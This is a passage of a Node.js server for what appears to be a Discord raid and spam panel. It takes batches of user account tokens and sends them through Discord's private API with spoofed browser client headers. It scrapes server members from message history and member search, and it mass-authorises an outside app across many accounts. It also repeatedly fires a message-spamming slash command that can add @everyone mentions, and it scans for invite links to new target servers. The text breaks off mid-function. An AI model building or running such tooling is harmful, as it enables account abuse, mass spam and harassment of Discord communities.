const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const FormData = require('form-data');
const config = require('./config');
const { startBot, registerCommands, setMemberIds, getMemberIds, getRegisteredAtestCommand, getRegisteredAheCommand, createWebButton, sendMessagesDirectly, createButtonAndAutoClick, getRecentButtonCreation, clearRecentButtonCreation, clearAllRecentButtonCreations, updateRecentButtonCreation, getAtestMessage, clearAtestMessage, storeButtonPayload, getButtonPayload, initializeButtonCreationTracker, incrementButtonCreated, getButtonCreationStatus, cleanupButtonCreationTracker, clearAllButtonCreationTrackers, initializeBatchTracker, markChannelButtonCreated, getBatchStatus, cleanupBatchTracker, clearAllBatchTrackers, CLIENT_ID, BOT_TOKEN, client2 } = require('./bot');

// Stub for deprecated getRegisteredCommand (aanko removed)
const getRegisteredCommand = () => null;
const { fetchMembersViaGateway, executeButtonViaGateway, clickButtonDirectly } = require('./gateway');
const { startModBot } = require('./modbot');
const { saveRecordedMessages, getRecordedMessages, deleteRecordedMessages, getAllRecordedMessagesKeys, getLicenseSettings, setRequireLicense, setAdminPasswordHash, getAdminPasswordHash, createLicenseKey, validateLicenseKey, checkLicenseSession, unbindLicenseKey, revokeLicenseKey, deleteLicenseKey, getAllLicenseKeys, reactivateLicenseKey, getAutoScanState, updateAutoScanState, setAutoScanEnabled, addAutoScanSentInvite, getAutoScanSentInvites, getAutoScanPanelConfig, updateAutoScanPanelConfig, getDiscordSettings, updateDiscordSettings, setCameraChannel, getCameraChannel } = require('./storage/fileStorage');
const crypto = require('crypto');
const bcrypt = require('bcryptjs');
const { scanDiscordServers, extractInviteLinks } = require('./utils/discordInviteScanner');

const activeLicenseSessions = new Map();
let autoScanInterval = null;
let panelAutoScanInterval = null; // For panel-based autoscan

// Initialize auto-scan on startup
async function initializeAutoScan() {
  const state = await getAutoScanState();
  if (state.enabled && state.targetChannelId) {
    console.log('[AutoScan] Resuming auto-scan from previous session');
    startAutoScanLoop(state.targetChannelId);
  }
}

async function startAutoScanLoop(targetChannelId) {
  if (autoScanInterval) clearInterval(autoScanInterval);
  
  console.log(`[AutoScan] Starting scan loop for channel: ${targetChannelId}`);
  
  // Run scan immediately
  await performAutoScan(targetChannelId);
  
  // Then every 60 seconds
  autoScanInterval = setInterval(async () => {
    await performAutoScan(targetChannelId);
  }, 60000);
}

async function performAutoScan(targetChannelId) {
  try {
    const state = await getAutoScanState();
    if (!state.enabled) {
      if (autoScanInterval) clearInterval(autoScanInterval);
      autoScanInterval = null;
      return;
    }
    
    // Scan Discord servers
    const invites = await scanDiscordServers();
    if (!invites || invites.length === 0) return;
    
    // Get previously sent invites for this channel
    const sentInvites = await getAutoScanSentInvites(targetChannelId);
    const newInvites = invites.filter(inv => !sentInvites.includes(inv.url));
    
    if (newInvites.length === 0) return;
    
    // Send new invites to Discord channel
    try {
      const message = newInvites.map(inv => inv.url).join('\n');
      await axios.post(
        `https://discord.com/api/v10/channels/${targetChannelId}/messages`,
        { content: message },
        { 
          headers: { 
            'Authorization': `Bot ${BOT_TOKEN}`,
            'Content-Type': 'application/json'
          }
        }
      );
      
      // Track sent invites
      for (const inv of newInvites) {
        await addAutoScanSentInvite(targetChannelId, inv.url);
      }
      
      console.log(`[AutoScan] Sent ${newInvites.length} new invites to channel ${targetChannelId}`);
    } catch (err) {
      console.error('[AutoScan] Failed to send message:', err.message);
    }
  } catch (error) {
    console.error('[AutoScan] Error in scan loop:', error.message);
  }
}

const generateSessionId = () => {
    return crypto.randomBytes(32).toString('hex');
};

const app = express();
const PORT = config.PORT;

startBot().then(result => {
    if (result.success) {
        console.log('Discord bot started successfully');
    } else {
        console.error('Failed to start Discord bot:', result.error);
    }
});

startModBot().then(result => {
    if (result.success) {
        console.log('Moderation bot started successfully');
    } else {
        console.log('Moderation bot skipped or failed:', result.error);
    }
});

// Initialize auto-scan on startup (runs in background independently)
initializeAutoScan().catch(err => {
    console.error('[AutoScan] Failed to initialize:', err.message);
});

// Initialize panel auto-scan on startup (for persistent auto-scan)
async function initializePanelAutoScan() {
    const config = await getAutoScanPanelConfig();
    if (config && config.enabled && config.userToken && config.guildIds && config.guildIds.length > 0 && config.sendTargetChannelId) {
        console.log('[PanelAutoScan] Resuming auto-scan from previous session');
        startPanelAutoScanLoop(config.guildIds, config.userToken, config.channelIds, config.sendTargetChannelId);
    }
}

initializePanelAutoScan().catch(err => {
    console.error('[PanelAutoScan] Failed to initialize:', err.message);
});

// X Auto Fetcher removed - replaced with Discord invite scanning

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Global error handler
app.use((err, req, res, next) => {
    if (err) {
        console.error('Error:', err.message);
        if (!res.headersSent) {
            res.status(500).json({ success: false, error: err.message });
        }
    }
});

// Discord API base URL
const DISCORD_API_BASE = 'https://discord.com/api/v10';

// Active operations tracking for cancellation
const activeOperations = new Map();

// Progress tracking for UI display
const operationProgress = new Map();

// Large user_ids storage (for bypassing Discord's 6000 char limit)
const largeUserIdsStorage = new Map();

const storeLargeUserIds = (userIds) => {
    const key = `uids_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    largeUserIdsStorage.set(key, {
        userIds: userIds,
        createdAt: Date.now()
    });
    // Cleanup old entries (older than 1 hour)
    const now = Date.now();
    for (const [k, v] of largeUserIdsStorage.entries()) {
        if (now - v.createdAt > 3600000) {
            largeUserIdsStorage.delete(k);
        }
    }
    return key;
};

const getLargeUserIds = (key) => {
    const data = largeUserIdsStorage.get(key);
    return data ? data.userIds : null;
};

// Update progress for an operation
const updateProgress = (operationId, progressData) => {
    operationProgress.set(operationId, {
        ...progressData,
        updatedAt: Date.now()
    });
};

// Get progress for an operation
const getProgress = (operationId) => {
    return operationProgress.get(operationId);
};

// Clear old progress entries (older than 5 minutes)
setInterval(() => {
    const now = Date.now();
    for (const [id, data] of operationProgress.entries()) {
        if (now - data.updatedAt > 5 * 60 * 1000) {
            operationProgress.delete(id);
        }
    }
}, 60000);

// Generate unique operation ID
const generateOperationId = () => {
    return `op_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
};

// Check if operation should be cancelled
const shouldCancel = (operationId) => {
    const op = activeOperations.get(operationId);
    return op ? op.cancelled : false;
};

// Mark operation as cancelled
const cancelOperation = (operationId) => {
    const op = activeOperations.get(operationId);
    if (op) {
        op.cancelled = true;
        console.log(`[CANCEL] Operation ${operationId} marked for cancellation`);
        return true;
    }
    return false;
};

// Start tracking operation
const startOperation = (type) => {
    const id = generateOperationId();
    activeOperations.set(id, { type, cancelled: false, startTime: Date.now() });
    console.log(`[OP-START] ${type}: ${id}`);
    return id;
};

// End operation tracking
const endOperation = (operationId) => {
    activeOperations.delete(operationId);
    console.log(`[OP-END] ${operationId}`);
};

// Cancel all operations of a specific type
const cancelOperationsByType = (type) => {
    let count = 0;
    for (const [id, op] of activeOperations.entries()) {
        if (op.type === type) {
            op.cancelled = true;
            count++;
        }
    }
    console.log(`[CANCEL-TYPE] Cancelled ${count} operations of type: ${type}`);
    return count;
};

// Rate limiting helper
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Generate Discord client headers for user token requests
const getDiscordHeaders = (token) => {
    const superProperties = {
        os: "Windows",
        browser: "Chrome",
        device: "",
        system_locale: "ja",
        browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        browser_version: "120.0.0.0",
        os_version: "10",
        referrer: "",
        referring_domain: "",
        referrer_current: "",
        referring_domain_current: "",
        release_channel: "stable",
        client_build_number: 251236,
        client_event_source: null
    };

    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
        'X-Discord-Locale': 'ja',
        'X-Discord-Timezone': 'Asia/Tokyo',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    };
};

// Cancel operation endpoints
app.post('/api/cancel-operation', (req, res) => {
    const { operationId, type } = req.body;
    
    if (operationId) {
        const cancelled = cancelOperation(operationId);
        return res.json({ success: cancelled, message: cancelled ? 'Operation cancelled' : 'Operation not found' });
    }
    
    if (type) {
        const count = cancelOperationsByType(type);
        return res.json({ success: count > 0, cancelledCount: count });
    }
    
    res.status(400).json({ error: 'operationId or type required' });
});

app.post('/api/cancel-ahe-button', (req, res) => {
    const count = cancelOperationsByType('ahe-button');
    // Clear all button creation state when cancelled
    clearAllRecentButtonCreations();
    clearAllButtonCreationTrackers();
    clearAllBatchTrackers();
    res.json({ success: true, cancelledCount: count });
});

app.post('/api/cancel-dm-send', (req, res) => {
    const count = cancelOperationsByType('dm-send');
    res.json({ success: true, cancelledCount: count });
});

app.post('/api/cancel-direct-message', (req, res) => {
    const count = cancelOperationsByType('direct-message');
    res.json({ success: true, cancelledCount: count });
});

// Get guild members endpoint
// Get guild members endpoint using user permissions
app.post('/api/members', async (req, res) => {
    try {
        const { token, guildId } = req.body;

        if (!token || !guildId) {
            return res.status(400).json({ error: 'Token and Guild ID are required' });
        }

        const headers = getDiscordHeaders(token);

        // First, get guild info to verify access
        try {
            const guildResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}`, { headers });
        } catch (error) {
            if (error.response?.status === 403 || error.response?.status === 404) {
                return res.status(403).json({ error: 'Guild not found or no access' });
            }
            throw error;
        }

        // Get guild channels to find members through messages/presence
        let channelsResponse;
        try {
            channelsResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
        } catch (error) {
            return res.status(403).json({ error: 'Cannot access guild channels' });
        }

        const channels = channelsResponse.data.filter(channel => 
            channel.type === 0 || channel.type === 2 // Text or Voice channels
        );

        let allMembers = new Map(); // Use Map to avoid duplicates
        let processedChannels = 0;

        for (const channel of channels.slice(0, 5)) { // Limit to first 5 channels to avoid rate limits
            try {
                // Try to get recent messages from text channels
                if (channel.type === 0) {
                    const messagesResponse = await axios.get(
                        `${DISCORD_API_BASE}/channels/${channel.id}/messages?limit=100`, 
                        { headers }
                    );
                    
                    messagesResponse.data.forEach(message => {
                        if (message.author && !message.author.bot) {
                            allMembers.set(message.author.id, {
                                id: message.author.id,
                                username: message.author.username,
                                discriminator: message.author.discriminator || '0',
                                nickname: message.member?.nick || null
                            });
                        }
                    });
                }
                
                processedChannels++;
                await delay(200); // Rate limiting
                
            } catch (channelError) {
                // Skip channels we can't access
                console.log(`Skipping channel ${channel.id}: ${channelError.message}`);
                continue;
            }
        }

        // Try to get members through guild search if we have few results
        if (allMembers.size < 50) {
            try {
                // Search for common usernames to find more members
                const commonNames = ['a', 'e', 'i', 'o', 'u', 's', 't', 'n', 'r', 'l'];
                
                for (const query of commonNames.slice(0, 3)) {
                    try {
                        const searchResponse = await axios.get(
                            `${DISCORD_API_BASE}/guilds/${guildId}/members/search?query=${query}&limit=100`,
                            { headers }
                        );
                        
                        searchResponse.data.forEach(member => {
                            if (member.user && !member.user.bot) {
                                allMembers.set(member.user.id, {
                                    id: member.user.id,
                                    username: member.user.username,
                                    discriminator: member.user.discriminator || '0',
                                    nickname: member.nick || null
                                });
                            }
                        });
                        
                        await delay(300); // Rate limiting for search
                    } catch (searchError) {
                        console.log(`Search failed for query ${query}: ${searchError.message}`);
                    }
                }
            } catch (error) {
                console.log('Guild search not available');
            }
        }

        const memberArray = Array.from(allMembers.values());

        res.json({
            success: true,
            count: memberArray.length,
            members: memberArray,
            note: `Found ${memberArray.length} members through accessible channels and search. This method may not find all members.`
        });

    } catch (error) {
        console.error('Error fetching members:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'Invalid token' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'Insufficient permissions or guild not accessible' });
        } else if (error.response?.status === 404) {
            res.status(404).json({ error: 'Guild not found' });
        } else {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
});

// Get guild members via Gateway (OP 14 Lazy Request)
app.post('/api/members-gateway', async (req, res) => {
    try {
        const { token, guildId, channelId } = req.body;

        if (!token || !guildId) {
            return res.status(400).json({ error: 'Token and Guild ID are required' });
        }

        const headers = getDiscordHeaders(token);
        
        let targetChannelId = channelId;
        
        if (!targetChannelId) {
            try {
                const channelsResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
                const textChannels = channelsResponse.data.filter(channel => channel.type === 0);
                
                if (textChannels.length === 0) {
                    return res.status(400).json({ error: 'No text channels found in guild' });
                }
                
                targetChannelId = textChannels[0].id;
            } catch (error) {
                if (error.response?.status === 403 || error.response?.status === 404) {
                    return res.status(403).json({ error: 'Guild not found or no access' });
                }
                throw error;
            }
        }

        console.log(`Fetching members via Gateway for guild ${guildId}, channel ${targetChannelId}`);
        
        const result = await fetchMembersViaGateway(token, guildId, targetChannelId, 1000);
        
        res.json(result);

    } catch (error) {
        console.error('Error fetching members via Gateway:', error.message);
        
        if (error.message.includes('Invalid token') || error.message.includes('401')) {
            res.status(401).json({ error: 'Invalid token' });
        } else if (error.message.includes('403') || error.message.includes('permission')) {
            res.status(403).json({ error: 'Insufficient permissions or guild not accessible' });
        } else {
            res.status(500).json({ error: error.message || 'Internal server error' });
        }
    }
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve AI Face (Face Diagnosis) app - SPA fallback to index.html
app.use('/ai.Face', express.static(path.join(__dirname, 'public', 'ai.Face'), {
    maxAge: '1h',
    etag: false
}));
app.get('/ai.Face/*', (req, res) => {
    // Only serve index.html for routes without file extensions (SPA routing)
    if (!req.path.includes('.')) {
        res.sendFile(path.join(__dirname, 'public', 'ai.Face', 'index.html'));
    } else {
        res.status(404).send('Not Found');
    }
});

// Authorize external Discord app endpoint
app.post('/api/authorize-external-app', async (req, res) => {
    try {
        const { tokens, oauthUrl, scopes } = req.body;

        if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ error: 'Tokens are required' });
        }

        if (!oauthUrl) {
            return res.status(400).json({ error: 'OAuth2 URL is required' });
        }

        // Parse the OAuth2 URL to extract parameters
        let parsedUrl;
        try {
            parsedUrl = new URL(oauthUrl);
        } catch (e) {
            return res.status(400).json({ error: 'Invalid URL format' });
        }

        const clientId = parsedUrl.searchParams.get('client_id');
        if (!clientId) {
            return res.status(400).json({ error: 'client_id not found in URL' });
        }

        // Get scopes from URL or use provided scopes
        let urlScopes = parsedUrl.searchParams.get('scope');
        let finalScopes = [];
        
        if (urlScopes) {
            finalScopes = urlScopes.split(/[\s+%20]+/).filter(s => s);
        }
        
        // Add additional scopes from checkbox if provided
        if (scopes && Array.isArray(scopes)) {
            scopes.forEach(s => {
                if (!finalScopes.includes(s)) {
                    finalScopes.push(s);
                }
            });
        }
        
        // Default scopes if none provided
        if (finalScopes.length === 0) {
            finalScopes = ['identify', 'guilds'];
        }

        const validScopes = ['identify', 'guilds', 'email', 'connections', 'guilds.join', 'gdm.join', 'bot', 'applications.commands', 'messages.read', 'rpc', 'rpc.notifications.read', 'webhook.incoming'];
        const filteredScopes = finalScopes.filter(s => validScopes.includes(s));

        // Get other parameters from URL
        const permissions = parsedUrl.searchParams.get('permissions') || '0';
        const guildId = parsedUrl.searchParams.get('guild_id');
        const responseType = parsedUrl.searchParams.get('response_type') || 'code';

        const superProperties = {
            os: "Windows",
            browser: "Chrome",
            device: "",
            system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            browser_version: "120.0.0.0",
            os_version: "10",
            release_channel: "stable",
            client_build_number: 251236
        };

        const results = [];

        for (const token of tokens) {
            try {
                const headers = {
                    'Authorization': token.trim(),
                    'Content-Type': 'application/json',
                    'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
                    'X-Discord-Locale': 'ja',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Origin': 'https://discord.com',
                    'Referer': 'https://discord.com/oauth2/authorize'
                };

                // Build the API authorize URL for User Install (integration_type=1)
                // User install doesn't require redirect_uri
                let authorizeApiUrl = `https://discord.com/api/v9/oauth2/authorize?client_id=${clientId}&integration_type=1&scope=applications.commands`;

                console.log(`[OAUTH] Step 1: Getting authorization info for app ${clientId} (User Install)...`);
                
                // Step 1: GET request to get authorization info
                const getResponse = await axios.get(authorizeApiUrl, { headers });
                console.log(`[OAUTH] GET response status: ${getResponse.status}`);
                console.log(`[OAUTH] GET response data:`, JSON.stringify(getResponse.data, null, 2));
                
                const alreadyAuthorized = getResponse.data?.authorized === true;
                
                if (alreadyAuthorized) {
                    results.push({ success: true, token: token.substring(0, 10) + '...', message: 'Already authorized' });
                    console.log(`[OAUTH] App ${clientId} already authorized for token ${token.substring(0, 10)}...`);
                    continue;
                }
                
                // Step 2: POST request to authorize (User Install)
                const authorizePayload = {
                    authorize: true,
                    integration_type: 1,  // User install
                    permissions: "0"
                };

                console.log(`[OAUTH] Step 2: Authorizing app ${clientId} as User Install...`);
                const postResponse = await axios.post(authorizeApiUrl, authorizePayload, { headers });
                console.log(`[OAUTH] POST response status: ${postResponse.status}`);
                console.log(`[OAUTH] POST response data:`, JSON.stringify(postResponse.data, null, 2));

                if (postResponse.status === 200) {
                    // Check if the location contains an error
                    const location = postResponse.data?.location || '';
                    if (location.includes('error=')) {
                        const errorMatch = location.match(/error_description=([^&]+)/);
                        const errorDesc = errorMatch ? decodeURIComponent(errorMatch[1].replace(/\+/g, ' ')) : 'Authorization failed';
                        results.push({ success: false, error: errorDesc, token: token.substring(0, 10) + '...' });
                        console.log(`[OAUTH] Failed to authorize app ${clientId}: ${errorDesc}`);
                    } else {
                        results.push({ success: true, token: token.substring(0, 10) + '...' });
                        console.log(`[OAUTH] Successfully authorized app ${clientId} for token ${token.substring(0, 10)}...`);
                    }
                } else {
                    results.push({ success: false, error: `Unexpected response: ${postResponse.status}`, token: token.substring(0, 10) + '...' });
                }

            } catch (error) {
                const errorMsg = error.response?.data?.message || error.response?.data?.error || error.message || 'Unknown error';
                console.error(`[OAUTH] Error for token ${token.substring(0, 10)}...:`, errorMsg);
                if (error.response?.data) {
                    console.error(`[OAUTH] Full error response:`, JSON.stringify(error.response.data, null, 2));
                }
                results.push({ success: false, error: errorMsg, token: token.substring(0, 10) + '...' });
            }
        }

        res.json({
            success: true,
            results: results
        });

    } catch (error) {
        console.error('Error in authorize-external-app:', error);
        res.status(500).json({ error: error.message || 'Internal server error' });
    }
});

// Get user applications endpoint
app.post('/api/applications', async (req, res) => {
    try {
        const { token } = req.body;

        if (!token) {
            return res.status(400).json({ error: 'Token is required' });
        }

        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        };

        // Get user's applications
        const response = await axios.get(`${DISCORD_API_BASE}/applications`, { headers });
        
        res.json({
            success: true,
            applications: response.data
        });

    } catch (error) {
        console.error('Error fetching applications:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'Invalid token' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'Insufficient permissions' });
        } else {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
});

// Search commands endpoint
app.post('/api/commands/search', async (req, res) => {
    try {
        const { token, query } = req.body;

        if (!token || !query) {
            return res.status(400).json({ error: 'Token and query are required' });
        }

        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        };

        // Get user's applications first
        const appsResponse = await axios.get(`${DISCORD_API_BASE}/applications`, { headers });
        const applications = appsResponse.data;

        let allCommands = [];

        // Get commands from each application
        for (const app of applications) {
            try {
                const commandsResponse = await axios.get(
                    `${DISCORD_API_BASE}/applications/${app.id}/commands`,
                    { headers }
                );
                
                const commands = commandsResponse.data.filter(cmd => 
                    cmd.name.toLowerCase().includes(query.toLowerCase())
                );
                
                allCommands.push(...commands.map(cmd => ({
                    ...cmd,
                    applicationId: app.id,
                    applicationName: app.name
                })));
                
                await delay(100); // Rate limiting
            } catch (cmdError) {
                console.log(`Failed to get commands for app ${app.id}: ${cmdError.message}`);
            }
        }

        res.json({
            success: true,
            commands: allCommands
        });

    } catch (error) {
        console.error('Error searching commands:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'Invalid token' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'Insufficient permissions' });
        } else {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
});

// Execute command endpoint
app.post('/api/commands/execute', async (req, res) => {
    try {
        const { token, applicationId, commandName, options } = req.body;

        if (!token || !applicationId || !commandName) {
            return res.status(400).json({ error: 'Token, applicationId, and commandName are required' });
        }

        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        };

        // Create interaction payload
        const payload = {
            type: 2, // APPLICATION_COMMAND
            application_id: applicationId,
            data: {
                name: commandName,
                type: 1, // CHAT_INPUT
                options: options || []
            }
        };

        // Execute the command (this is a simplified approach)
        const response = await axios.post(`${DISCORD_API_BASE}/interactions`, payload, { headers });
        
        res.json({
            success: true,
            result: response.data
        });

    } catch (error) {
        console.error('Error executing command:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'Invalid token' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'Insufficient permissions' });
        } else {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
});

app.post('/api/search-commands', async (req, res) => {
    try {
        const { token, channelId, applicationId, query } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'Token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);

        let url = `${DISCORD_API_BASE}/channels/${channelId}/application-commands/search`;
        const params = new URLSearchParams();
        if (query) params.append('query', query);
        if (applicationId) params.append('application_id', applicationId);
        params.append('type', '1');
        params.append('limit', '25');
        
        const response = await axios.get(`${url}?${params.toString()}`, { headers });
        
        res.json({
            success: true,
            commands: response.data.application_commands || []
        });

    } catch (error) {
        console.error('Error searching commands:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            error: error.response?.data?.message || 'Failed to search commands' 
        });
    }
});

app.post('/api/execute-he', async (req, res) => {
    try {
        const { token, channelId, guildId, applicationId, commandId, commandVersion, commandData, options, count } = req.body;

        if (!token || !channelId || !applicationId || !commandId) {
            return res.status(400).json({ error: 'Token, channelId, applicationId, and commandId are required' });
        }

        const executeCount = Math.max(parseInt(count) || 1, 1);
        const results = [];
        
        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const generateBoundary = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const sessionId = generateSessionId();
        
        for (let i = 0; i < executeCount; i++) {
            try {
                const nonce = generateSnowflake();
                
                const payload = {
                    type: 2,
                    application_id: applicationId,
                    channel_id: channelId,
                    session_id: sessionId,
                    nonce: nonce,
                    data: {
                        version: commandVersion,
                        id: commandId,
                        name: 'he',
                        type: 1,
                        options: options || [],
                        application_command: commandData || {
                            id: commandId,
                            application_id: applicationId,
                            version: commandVersion,
                            name: 'he',
                            description: 'メッセージを5回送信',
                            type: 1,
                            options: [
                                { type: 4, name: 'rand_len', description: 'ランダム文字列の長さ', required: false },
                                { type: 5, name: 'mention_everyone', description: '@everyoneメンションを付けるかどうか', required: false },
                                { type: 3, name: 'text', description: '言わせたい言葉', required: false }
                            ],
                            integration_types: [0, 1],
                            contexts: [0, 1, 2]
                        }
                    }
                };

                if (guildId) {
                    payload.guild_id = guildId;
                }

                const boundary = '----WebKitFormBoundary' + generateBoundary();
                const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

                const superProperties = {
                    os: "Windows",
                    browser: "Chrome",
                    device: "",
                    system_locale: "ja",
                    browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    browser_version: "120.0.0.0",
                    os_version: "10",
                    referrer: "",
                    referring_domain: "",
                    referrer_current: "",
                    referring_domain_current: "",
                    release_channel: "stable",
                    client_build_number: 251236,
                    client_event_source: null
                };

                const headers = {
                    'Authorization': token,
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
                    'X-Discord-Locale': 'ja',
                    'X-Discord-Timezone': 'Asia/Tokyo',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Origin': 'https://discord.com',
                    'Referer': 'https://discord.com/channels/@me'
                };

                const response = await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers });
                results.push({ success: true, index: i + 1 });
                
                if (i < executeCount - 1) {
                    await delay(1500 + Math.random() * 1000);
                }
            } catch (execError) {
                const errorData = execError.response?.data;
                results.push({ 
                    success: false, 
                    index: i + 1, 
                    error: errorData?.message || execError.message,
                    code: errorData?.code
                });
                
                if (execError.response?.status === 429) {
                    const retryAfter = errorData?.retry_after || 5;
                    await delay(retryAfter * 1000);
                } else if (execError.response?.status >= 400) {
                    await delay(500);
                }
            }
        }

        const successCount = results.filter(r => r.success).length;
        res.json({
            success: true,
            executed: successCount,
            total: executeCount,
            results: results
        });

    } catch (error) {
        console.error('Error executing command:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            error: error.response?.data?.message || 'Failed to execute command' 
        });
    }
});

app.post('/api/bot/set-members', async (req, res) => {
    try {
        const { memberIds } = req.body;
        
        if (!memberIds || !Array.isArray(memberIds)) {
            return res.status(400).json({ error: 'memberIds array is required' });
        }
        
        setMemberIds(memberIds);
        
        res.json({
            success: true,
            message: `Stored ${memberIds.length} member IDs for random mentions`,
            count: memberIds.length
        });
    } catch (error) {
        console.error('Error setting member IDs:', error);
        res.status(500).json({ error: 'Failed to set member IDs' });
    }
});

app.get('/api/bot/info', async (req, res) => {
    try {
        const memberIds = getMemberIds();
        res.json({
            success: true,
            clientId: CLIENT_ID,
            inviteUrl: `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&integration_type=1&scope=applications.commands`,
            serverInviteUrl: `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=2147485696&integration_type=0&scope=bot+applications.commands`,
            storedMemberCount: memberIds.length
        });
    } catch (error) {
        console.error('Error getting bot info:', error);
        res.status(500).json({ error: 'Failed to get bot info' });
    }
});

// Get stored large user_ids by key
app.get('/api/stored-user-ids/:key', (req, res) => {
    const { key } = req.params;
    const userIds = getLargeUserIds(key);
    if (userIds) {
        res.json({ success: true, userIds: userIds });
    } else {
        res.json({ success: false, error: 'Not found or expired' });
    }
});

// Get operation progress
app.get('/api/operation-progress/:operationId', (req, res) => {
    const { operationId } = req.params;
    const progress = getProgress(operationId);
    if (progress) {
        res.json({ success: true, ...progress });
    } else {
        res.json({ success: false, error: 'Operation not found' });
    }
});

app.get('/api/config/default-message', (req, res) => {
    try {
        let message = config.DEFAULT_MESSAGE;
        
        if (message && message.length > 2000) {
            message = message.substring(0, 1997) + '...';
        }
        
        res.json({
            success: true,
            defaultMessage: message
        });
    } catch (error) {
        console.error('Error getting default message:', error);
        res.status(500).json({ error: 'Failed to get default message' });
    }
});

app.post('/api/get-dm-channel', async (req, res) => {
    try {
        const { token, userId } = req.body;

        if (!token) {
            return res.status(400).json({ error: 'Token is required' });
        }

        const headers = getDiscordHeaders(token);

        let channelId;
        
        if (userId) {
            const response = await axios.post(`${DISCORD_API_BASE}/users/@me/channels`, {
                recipient_id: userId
            }, { headers });
            channelId = response.data.id;
        } else {
            const response = await axios.get(`${DISCORD_API_BASE}/users/@me/channels`, { headers });
            if (response.data.length > 0) {
                channelId = response.data[0].id;
            }
        }

        res.json({
            success: true,
            channelId: channelId
        });

    } catch (error) {
        console.error('Error getting DM channel:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            error: error.response?.data?.message || 'Failed to get DM channel' 
        });
    }
});

app.post('/api/debug-search-aanko', async (req, res) => {
    try {
        const { token, channelId } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'Token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);

        const searchUrl = `${DISCORD_API_BASE}/channels/${channelId}/application-commands/search?query=aanko&type=1&limit=25`;
        console.log('Searching at:', searchUrl);
        
        const searchResponse = await axios.get(searchUrl, { headers });
        console.log('Search response:', JSON.stringify(searchResponse.data, null, 2));
        
        const commands = searchResponse.data.application_commands || [];
        const aankoCommand = commands.find(cmd => cmd.name === 'aanko');
        
        res.json({
            success: true,
            totalCommands: commands.length,
            allCommands: commands.map(c => ({ name: c.name, id: c.id, application_id: c.application_id })),
            aankoFound: !!aankoCommand,
            aankoCommand: aankoCommand || null,
            botClientId: CLIENT_ID
        });

    } catch (error) {
